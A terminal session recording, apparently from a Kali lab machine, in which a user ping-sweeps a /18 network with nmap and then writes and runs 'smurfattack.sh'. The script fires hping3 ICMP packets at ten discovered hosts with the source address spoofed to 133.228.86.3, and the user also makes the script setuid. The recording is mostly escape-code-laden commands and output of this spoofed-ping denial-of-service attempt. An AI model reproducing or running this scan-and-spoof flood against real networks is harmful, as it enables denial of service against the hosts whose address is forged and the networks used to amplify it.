@@ -1,0 +1,246 @@
+Script started on 2023-03-19 18:03:36-04:00 [TERM="xterm" TTY="/dev/pts/2" COLUMNS="74" LINES="24"]
+[?2004hkali-133.228.86.1> clear
+[?2004l[H[2J[3J
+[?2004hkali-133.228.86.1> clear[1Pexit[K[K[K[Knmap -sn -T4 133.22.[K8.64.0/18
+[?2004lStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 18:03 EDT
+
+
+[?2004hkali-133.228.86.1> nmap -sn -T4 133.228.64.0/18
+[?2004lStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 18:06 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 133.228.72.1
+Host is up (0.00070s latency).
+Nmap scan report for 133.228.72.2
+Host is up (0.0010s latency).
+Nmap scan report for 133.228.72.3
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.80.1
+Host is up (0.0025s latency).
+Nmap scan report for 133.228.80.2
+Host is up (0.0010s latency).
+Nmap scan report for 133.228.80.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.81.1
+Host is up (0.0027s latency).
+Nmap scan report for 133.228.81.2
+Host is up (0.00094s latency).
+Nmap scan report for 133.228.81.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.82.1
+Host is up (0.0025s latency).
+Nmap scan report for 133.228.82.2
+Host is up (0.00085s latency).
+Nmap scan report for 133.228.82.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.83.1
+Host is up (0.0025s latency).
+Nmap scan report for 133.228.83.2
+Host is up (0.00084s latency).
+Nmap scan report for 133.228.83.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.84.1
+Host is up (0.0025s latency).
+Nmap scan report for 133.228.84.2
+Host is up (0.00082s latency).
+Nmap scan report for 133.228.84.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.85.1
+Host is up (0.0025s latency).
+Nmap scan report for 133.228.85.2
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.85.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.86.1
+Host is up (0.00016s latency).
+Nmap scan report for 133.228.86.2
+Host is up (0.00090s latency).
+Nmap scan report for 133.228.86.3
+Host is up (0.0039s latency).
+Nmap scan report for 133.228.87.1
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.87.2
+Host is up (0.0028s latency).
+Nmap scan report for 133.228.87.3
+Host is up (0.0038s latency).
+Nmap scan report for 133.228.88.1
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.88.2
+Host is up (0.0027s latency).
+Nmap scan report for 133.228.88.3
+Host is up (0.0037s latency).
+Nmap scan report for 133.228.89.1
+Host is up (0.0017s latency).
+Nmap scan report for 133.228.89.2
+Host is up (0.0027s latency).
+Nmap scan report for 133.228.89.3
+Host is up (0.0037s latency).
+Nmap scan report for 133.228.90.1
+Host is up (0.00052s latency).
+Nmap scan report for 133.228.90.2
+Host is up (0.0027s latency).
+Nmap scan report for 133.228.90.3
+Host is up (0.0037s latency).
+Nmap scan report for 133.228.92.1
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.92.2
+Host is up (0.0027s latency).
+Nmap scan report for 133.228.92.3
+Host is up (0.0037s latency).
+Nmap scan report for 133.228.94.1
+Host is up (0.0011s latency).
+Nmap scan report for 133.228.94.2
+Host is up (0.0026s latency).
+Nmap scan report for 133.228.94.3
+Host is up (0.0037s latency).
+Nmap scan report for 133.228.96.1
+Host is up (0.0019s latency).
+Nmap scan report for 133.228.96.2
+Host is up (0.0043s latency).
+Nmap scan report for 133.228.96.3
+Host is up (0.0026s latency).
+Nmap scan report for 133.228.98.1
+Host is up (0.0019s latency).
+Nmap scan report for 133.228.98.2
+Host is up (0.0042s latency).
+Nmap scan report for 133.228.98.3
+Host is up (0.0022s latency).
+Nmap scan report for 133.228.100.1
+Host is up (0.0018s latency).
+Nmap scan report for 133.228.100.2
+Host is up (0.0038s latency).
+Nmap scan report for 133.228.100.3
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.102.1
+Host is up (0.0017s latency).
+Nmap scan report for 133.228.102.2
+Host is up (0.0031s latency).
+Nmap scan report for 133.228.102.3
+Host is up (0.0013s latency).
+Nmap scan report for 133.228.104.1
+Host is up (0.0014s latency).
+Nmap scan report for 133.228.104.2
+Host is up (0.0030s latency).
+Nmap scan report for 133.228.104.3
+Host is up (0.0012s latency).
+Nmap scan report for 133.228.106.1
+Host is up (0.0016s latency).
+Nmap scan report for 133.228.106.2
+Host is up (0.0030s latency).
+Nmap scan report for 133.228.106.3
+Host is up (0.0019s latency).
+Nmap scan report for 133.228.108.1
+Host is up (0.0045s latency).
+Nmap scan report for 133.228.108.2
+Host is up (0.0029s latency).
+Nmap scan report for 133.228.108.3
+Host is up (0.0016s latency).
+Nmap scan report for 133.228.110.1
+Host is up (0.0044s latency).
+Nmap scan report for 133.228.110.2
+Host is up (0.0026s latency).
+Nmap scan report for 133.228.110.3
+Host is up (0.0015s latency).
+
+
+[?2004hkali-133.228.86.1> nmap -sn -T4 133.228.64.0/18[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[K[K[K[K[K[Knano t[Ksmurfattack.sh 
+[?2004l[?2004h[?1049h[22;0;0t[1;24r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[22;31H(B[0;7m[ Reading... ](B[m[22;29H(B[0;7m[ Read 12 lines ](B[m[H(B[0;7m  GNU nano 6.4                  smurfattack.sh                            [1;73H(B[m[23d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[23;57H(B[0;7m^T(B[m Execute[24d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[36m#!/bin/bash[3d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.72.1 [32m&[4d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.72.2 [32m&[5d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.72.3 [32m&[6d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.80.1 [32m&[7d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.80.2 [32m&[8d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.80.3 [32m&[9d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.81.1 [32m&[10d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.81.2 [32m&[11d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.81.3 [32m&[12d[39m(B[msudo hping3 -1(B[0;1m[35m -q -c[39m(B[m 10(B[0;1m[35m -a[39m(B[m 133.228.86.3 133.228.82.1 [32m&[39m[42m [2d[49m(B[m[?12l[?25h[?25l[22d[J[24d[?12l[?25h[24;1H[?1049l[23;0;0t[?1l>[?2004l
+[?2004hkali-133.228.86.1> y[Kls -all smurfattack.sh
+[?2004l-rwsr-sr-x 1 crsuser crsuser 564 Mar 15 21:33 [0m[37;41msmurfattack.sh[0m
+
+[?2004hkali-133.228.86.1> ls -all smurfattack.sh[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K./smurfattack.sh
+[?2004l
+[?2004hkali-133.228.86.1> [sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+[sudo] password for crsuser: 
+sudo: unable to read password: Input/output error
+sudo: a password is required
+^C[?2004l[?2004h[?2004l
+
+[?2004hkali-133.228.86.1> ./smurfattack.shs./smurfattack.shu./smurfattack.shd./smurfattack.sho./smurfattack.sh ./smurfattack.sh
+[?2004l[sudo] password for crsuser: 
+
+[?2004hkali-133.228.86.1> sudo ./smurfattack.sh[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kchmod +s smurfattack.sh
+[?2004l
+[?2004hkali-133.228.86.1> sudo chmod +s smurfattack.sh[1Psmurfattack.sh[1Pmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Psmurfattack.sh[1Pmurfattack.sh.smurfattack.sh/smurfattack.sh
+[?2004l
+[?2004hkali-133.228.86.1> HPING 133.228.80.2 (eth1 133.228.80.2): icmp mode set, 28 headers + 0 data bytesHPING 133.228.72.2 (eth1 133.228.72.2): icmp mode set, 28 headers + 0 data bytesHPING 133.228.81.1 (eth1 133.228.81.1): icmp mode set, 28 headers + 0 data bytesHPING 133.228.81.2 (eth1 133.228.81.2): icmp mode set, 28 headers + 0 data bytesHPING 133.228.81.3 (eth1 133.228.81.3): icmp mode set, 28 headers + 0 data bytesHPING 133.228.80.1 (eth1 133.228.80.1): icmp mode set, 28 headers + 0 data bytesHPING 133.228.72.3 (eth1 133.228.72.3): icmp mode set, 28 headers + 0 data bytesHPING 133.228.80.3 (eth1 133.228.80.3): icmp mode set, 28 headers + 0 data bytesHPING 133.228.82.1 (eth1 133.228.82.1): icmp mode set, 28 headers + 0 data bytesHPING 133.228.72.1 (eth1 133.228.72.1): icmp mode set, 28 headers + 0 data bytes
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--- 133.228.72.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.80.1 hping statistic ------ 133.228.81.1 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+10 packets transmitted, 0 packets received, 100% packet loss--- 133.228.80.3 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.82.1 hping statistic ---
+
+
+10 packets transmitted, 0 packets received, 100% packet loss--- 133.228.81.2 hping statistic ---
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+
+--- 133.228.72.1 hping statistic ---
+--- 133.228.81.3 hping statistic ---10 packets transmitted, 0 packets received, 100% packet loss
+10 packets transmitted, 0 packets received, 100% packet loss
+
+
+round-trip min/avg/max = 0.0/0.0/0.0 msround-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 133.228.80.2 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+--- 133.228.72.2 hping statistic ---
+10 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+c[K^C[?2004l[?2004h[?2004l
+
+[?2004hkali-133.228.86.1> exit
+[?2004lexit
+
+Script done on 2023-03-19 18:14:16-04:00 [COMMAND_EXIT_CODE="130"]
